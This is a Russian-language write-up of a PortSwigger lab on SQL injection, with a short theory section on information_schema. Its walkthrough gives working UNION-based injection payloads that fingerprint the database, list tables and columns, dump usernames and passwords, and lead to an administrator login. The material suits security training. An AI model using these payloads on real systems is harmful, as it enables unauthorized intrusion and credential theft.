# SQL injection attack, listing the database contents on non-Oracle databases

## Theory

<h3>Список содержимого базы данных</h3>

Большинство типов баз данных имеют набор представлений, называемых информационной схемой, которые предоставляют информацию о базе данных.

Мы можете запросить information_schema.tables, чтобы получить список таблиц в базе данных:
```
SELECT * FROM information_schema.tables
```

Это возвращает вывод, подобный следующему:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Затем мы можем запросить information_schema.columns, чтобы получить список столбцов в отдельных таблицах:
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
Это возвращает вывод, подобный следующему:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/assets/1.png)

Выбираем пункт Pets. Определяем [количество стобцов](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_determining_the_number_of_columns_returned_by_the_query) и какой [тип данных](https://github.com/fobblified/Writeups/tree/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_finding_a_column_containing_text) они принимают. Определяем, какая база данных используется, путем подстановки запроса вывода версии базы данных.

```
/filter?category=Pets'UNION+SELECT+version(),NULL--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/assets/2.png)

Выведем таблицы которые есть в базе данных.
```
/filter?category=Pets'UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/assets/3.png)

Находим нужную таблицу. Достанем столбцы из этой таблицы.
```
/filter?category=Pets'UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name+%3d+'users_taqwnf'--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/assets/4.png)

Затем достанем данные пользователей из столбца.
```
/filter?category=Pets'UNION+SELECT+username_feadal,password_aoavzn+FROM+users_taqwnf--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/assets/5.png)

Заходим в учетную запись администратора.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/assets/6.png)
